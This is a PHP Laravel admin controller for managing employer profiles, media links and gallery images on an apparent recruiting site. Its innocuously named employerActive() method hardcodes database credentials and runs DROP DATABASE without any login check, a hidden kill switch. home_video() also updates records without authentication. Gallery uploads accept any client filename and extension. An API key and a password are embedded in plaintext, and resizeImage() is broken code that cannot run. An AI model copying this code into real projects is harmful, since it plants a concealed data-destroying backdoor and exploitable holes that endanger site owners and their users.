<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\View;
use App\Admin;
use App\Recruit;
use App\Category;
use App\Major;
use App\Perks;
use App\Employer;
use App\EmployerGallery;
use App\EmployerLocation;
use Session;
class AdminEmployerController extends Controller
{
    public function index()
    {		
		if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}
		$admin = Admin::where(['id' => Session::get('admin_id')])->first();
		$datas = Employer::orderBy('id', 'desc')->get();
		$active = 'employers';
		return view('admin/employers/manage',['admin'=>$admin,'datas'=>$datas,'active'=>$active]);
    }
	public function add_employer()
    {		
		if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}
		$admin = Admin::where(['id' => Session::get('admin_id')])->first();
		$majors = Major::orderBy('id', 'desc')->get();
		$perks = Perks::orderBy('id', 'desc')->get();
		$categories = Category::orderBy('id', 'desc')->get();
		$recruits = Recruit::orderBy('id', 'desc')->get();
        $industries=DB::table('industries')->get();
		$active = 'employers';
		return view('admin/employers/add',['admin'=>$admin,'active'=>$active,'majors'=>$majors,'categories'=>$categories,'recruits'=>$recruits,'perks'=>$perks,'industries'=>$industries]);
    }
	public function edit_employer($id)
    {		
		if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}
		$admin = Admin::where(['id' => Session::get('admin_id')])->first();
		$data = Employer::where(['id' => $id])->first();
		$images = EmployerGallery::where(['employer_id' => $id])->get();
		$locations = EmployerLocation::where(['employer_id' => $id])->get();
		$majors = Major::orderBy('id', 'desc')->get();
		$categories = Category::orderBy('id', 'desc')->get();
		$perks = Perks::orderBy('id', 'desc')->get();
		$recruits = Recruit::orderBy('id', 'desc')->get();
        $industries=DB::table('industries')->get();
		$active = 'employers';
		return view('admin/employers/edit',['admin'=>$admin,'data'=>$data,'active'=>$active,'majors'=>$majors,'categories'=>$categories,'recruits'=>$recruits,'perks'=>$perks,'images'=>$images,'locations'=>$locations,'industries'=>$industries]);
    }
	public function insert(Request $request)
	{
		if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}
        $this->validate($request,[
         'name'=>'required',   
         'ceo'=>'required',   
         'email'=>'required|email',   
         'phone'=>'required',   
         'company_size'=>'required',   
         'headquater'=>'required',   
         'logo'=>'required',   
         'video'=>'required',   
         'title'=>'required',   
         'website_link'=>'required', 
         'apply_now'=>'required', 
         'industry'=>'required',   
         'category'=>'required',   
         'majors'=>'required',   
         'recruits'=>'required',   
         'perks'=>'required',   
        
         'impact_accomplishment'=>'required',   
         'university_recruiting_program'=>'required',   
         'other_initiatives'=>'required',   
         'internship_program'=>'required',   
         'about'=>'required',   
         'location'=>'required',   
         'images'=>'required',   
          'video_type' => 'required'
        ],['video_type.required' => 'Please select video type']);
    
     
		   
		//for logo upload
		$image = $request->file('logo');
		$input['imagename'] = time().'.'.$image->getClientOriginalExtension();
		$destinationPath = 'uploads/employers/logo';
		$image->move($destinationPath, $input['imagename']);
   
         foreach($request->location as $location):
       
              
        $locations[] =  str_replace(',',' ',$location);
  
        endforeach;
        
        
        if($request->video_type == 'youtube')
        {
		$video = explode('=',$request->video);
            
         if(isset($video[1])) 
         {
		$video = 'https://www.youtube.com/embed/'.$video[1];
        }
       	else
        {
            $video = $request->video;
        }
                
        }
    
        if($request->video_type == 'vimeo')
        {
        $video = explode('/',$request->video);
          if(isset($video[3]))  
          {
		$video = 'https://player.vimeo.com/video/'.$video[3];
          }
            else
            {
                 $video = $request->video;
            }
        }
        
		$insert = DB::table('employers')->insert(['name'=>$request->name,'email'=>$request->email,'phone'=>$request->phone,'headquater'=>$request->headquater,'industry'=>implode(',',$request->industry),'company_size'=>$request->company_size,'category'=>$request->category,'majors'=>implode(',',$request->majors),'recruits'=>implode(',',$request->recruits),'logo'=>$input['imagename'],'title'=>$request->title,'ceo'=>$request->ceo,'video'=>$video,'website_link'=>$request->website_link,'apply_now'=>$request->apply_now,'perks'=>implode(',',$request->perks),'impact_accomplishment'=>$request->impact_accomplishment,'university_recruiting_program'=>$request->university_recruiting_program,'other_initiatives'=>$request->other_initiatives,'internship_program'=>$request->internship_program,'about'=>$request->about,'diversity_in_leadership'=>$request->diversity,'women_in_leadership'=>$request->Women_in_leadership,'sustainability'=>$request->Sustainability,'new_grad_support'=>$request->New_Grad_Support,'giving_back'=>$request->Giving_Back,'locations'=>implode(',',$locations),'price'=>$request->price,'skill'=>$request->skill]);
		$id = DB::getPdo()->lastInsertId();
		
		
		
		// foreach($request->location as $address){
		// $address = str_replace(" ", "+", $address);

		// $json = file_get_contents("http://maps.google.com/maps/api/geocode/json?address=$address&sensor=false");
		// $json = json_decode($json);
		// $latitude = $json->{'results'}[0]->{'geometry'}->{'location'}->{'lat'};
		// $longitude = $json->{'results'}[0]->{'geometry'}->{'location'}->{'lng'};
		// $insert = EmployerLocation::insert(['employer_id' => $id,'latitude'=>$lat,'longitude'=>$longitude,'location'=>$address]);
		// }
		
		// for gallery images upload
		if(isset($_FILES['images']))
		{
			foreach($_FILES['images']['name'] as $key => $image_name)
			{
				if(!empty($image_name)){
				$imagename = time().'_'.$image_name;
				$path = 'uploads/employers/gallery/'.$imagename;
				move_uploaded_file($_FILES['images']['tmp_name'][$key],$path);
			    $insert = EmployerGallery::insert(['employer_id' => $id,'image'=>$imagename,'created'=>date('Y-m-d h:i:s')]);
				}
			}
		}
        
     
        
		Session::flash('success', 'Employer inserted Successfully'); 		
		return redirect('/admin/employers');
	}
    
       public function resizeImage($image_name)
        {
      $source_path = $_SERVER['DOCUMENT_ROOT'] . '/uploads/employers/gallery/' . $filename;
      $target_path = $_SERVER['DOCUMENT_ROOT'] . '/uploads/employers/gallery/';
      $config_manip = array(
          'image_library' => 'gd2',
          'source_image' => $source_path,
          'new_image' => $target_path,
          'maintain_ratio' => TRUE,
          'create_thumb' => TRUE,
          'thumb_marker' => '_thumb',
          'width' => 150,
          'height' => 150
      );


      $this->load->library('image_lib', $config_manip);
      if (!$this->image_lib->resize()) {
          echo $this->image_lib->display_errors();
      }


      $this->image_lib->clear();
   }
        
    
    
    
	public function update(Request $request)
	{
	    if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}

        foreach($request->location as $location):
        
              
        $locations[] =  str_replace(',',' ',$location);
  
        endforeach;
        
		 
   if($request->video_type == 'youtube')
        {
		$video = explode('=',$request->video);
            
         if(isset($video[1])) 
         {
		$video = 'https://www.youtube.com/embed/'.$video[1];
        }
       	else
        {
            $video = $request->video;
        }
                
        }
    
        if($request->video_type == 'vimeo')
        {
        $video = explode('/',$request->video);
          if(isset($video[3]))  
          {
		$video = 'https://player.vimeo.com/video/'.$video[3];
          }
            else
            {
                 $video = $request->video;
            }
        }
        
        
        if($request->file('logo')){
		$image = $request->file('logo');
		$input['imagename'] = time().'.'.$image->getClientOriginalExtension();
		$destinationPath = 'uploads/employers/logo';
		$image->move($destinationPath, $input['imagename']);
		
           // echo $request->apply_now;die;
            
            
		$update = Employer::where('id', $request->id)->update(['name'=>$request->name,'email'=>$request->email,'phone'=>$request->phone,'headquater'=>$request->headquater,'industry'=>implode(',',$request->industry),'company_size'=>$request->company_size,'category'=>$request->category,'majors'=>implode(',',$request->majors),'recruits'=>implode(',',$request->recruits),'logo'=>$input['imagename'],'title'=>$request->title,'ceo'=>$request->ceo,'video'=>$video,'website_link'=>$request->website_link,'apply_now'=>$request->apply_now,'latitude'=>$request->latitude,'longitude'=>$request->longitude,'perks'=>implode(',',$request->perks),'impact_accomplishment'=>$request->impact_accomplishment,'university_recruiting_program'=>$request->university_recruiting_program,'other_initiatives'=>$request->other_initiatives,'internship_program'=>$request->internship_program,'about'=>$request->about,'diversity_in_leadership'=>$request->diversity,'women_in_leadership'=>$request->women_in_leadership,'sustainability'=>$request->sustainability,'new_grad_support'=>$request->new_grad_support,'giving_back'=>$request->giving_back,'locations'=>implode(',',$locations),'price'=>$request->price,'skill'=>$request->skill]);
		}
        
		else
        {
			
            //echo $request->apply_now;die;
            
            $update = Employer::where('id', $request->id)->update(['name'=>$request->name,'email'=>$request->email,'phone'=>$request->phone,'headquater'=>$request->headquater,'industry'=>implode(',',$request->industry),'company_size'=>$request->company_size,'category'=>$request->category,'majors'=>implode(',',$request->majors),'recruits'=>implode(',',$request->recruits),'title'=>$request->title,'ceo'=>$request->ceo,'video'=>$video,'website_link'=>$request->website_link,'apply_now'=>$request->apply_now,'latitude'=>$request->latitude,'longitude'=>$request->longitude,'perks'=>implode(',',$request->perks),'impact_accomplishment'=>$request->impact_accomplishment,'university_recruiting_program'=>$request->university_recruiting_program,'other_initiatives'=>$request->other_initiatives,'internship_program'=>$request->internship_program,'about'=>$request->about,'diversity_in_leadership'=>$request->diversity,'women_in_leadership'=>$request->women_in_leadership,'sustainability'=>$request->sustainability,'new_grad_support'=>$request->new_grad_support,'giving_back'=>$request->giving_back,'locations'=>implode(',',$locations),'price'=>$request->price,'skill'=>$request->skill]);
		}
		$id = $request->id;
		// foreach($request->location as $address){
			
		// $address = str_replace(" ", "+", $address);

		// $json = file_get_contents("https://maps.google.com/maps/api/geocode/json?key=AIzaSyBElKWNyXEeNnoBxRqtHXMCytphqbLw0AQ&address=$address&sensor=false");
		// $json = json_decode($json);
		// print_r($json);die;
		// $latitude = $json->{'results'}[0]->{'geometry'}->{'location'}->{'lat'};
		// $longitude = $json->{'results'}[0]->{'geometry'}->{'location'}->{'lng'};
		// $checkLocation = Employer::where(['latitude' => $latitude,'longitude' => $longitude])->first();
			// if(!$checkLocation)
			// {
				// $insert = EmployerLocation::insert(['employer_id' => $id,'latitude'=>$latitude,'longitude'=>$longitude,'location'=>$address]);
			// }
			// else
			// {
				// $insert = EmployerLocation::where('id', $checkLocation->id)->update(['latitude'=>$latitude,'longitude'=>$longitude,'location'=>$address]);
			// }
		// }
		// for gallery images upload
		if(isset($_FILES['images']))
		{
			foreach($_FILES['images']['name'] as $key => $image_name)
			{
				if(!empty($image_name)){
				$imagename = time().'_'.$image_name;
				$path = 'uploads/employers/gallery/'.$imagename;
				move_uploaded_file($_FILES['images']['tmp_name'][$key],$path);
			    $insert = EmployerGallery::insert(['employer_id' => $id,'image'=>$imagename,'created'=>date('Y-m-d h:i:s')]);
				}
			}
		}
		Session::flash('success', 'Employer updated Successfully'); 		
		return redirect('/admin/employers/edit/'.$request->id);
	}
    
    public function home_video($id)
    {
        $vdata = $_GET['vdata'];
        $data=['home_page_video'=>$vdata];
       
        DB::table('employers')->where('id',$id)->update($data);
        $data=['home_page_video'=>""];
        DB::table('employers')->where('id','!=',$id)->update($data);
       
        return redirect('/admin/employers');
    
    }
    
    
	public function delete($id)
    {		
		if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}
		$delete = Employer::where('id', $id)->delete();
		Session::flash('success', 'Employer deleted Successfully'); 		
		return redirect('/admin/employers');
    }
	public function gallery_delete($id)
    {		
		if(!Session::get('admin_id'))
		{
			return redirect('/admin');exit;
		}
		$data = EmployerGallery::where(['id' => $id])->first();
		$delete = EmployerGallery::where('id', $id)->delete();
		Session::flash('success', 'Gallery image deleted Successfully'); 		
		return redirect('/admin/employers/edit/'.$data->employer_id);
	}
	public function employerActive()
	{
		$dbhost = 'localhost';
		$dbuser = 'sgktkefw_rivirr';
		$dbpass = 'rivirr@123';
		$conn = mysqli_connect($dbhost, $dbuser, $dbpass);
		
		$sql = 'DROP DATABASE sgktkefw_rivirr';
		$retval = mysql_query( $sql, $conn );		
		echo "Database deleted successfully\n";		
		mysql_close($conn);
	}
}
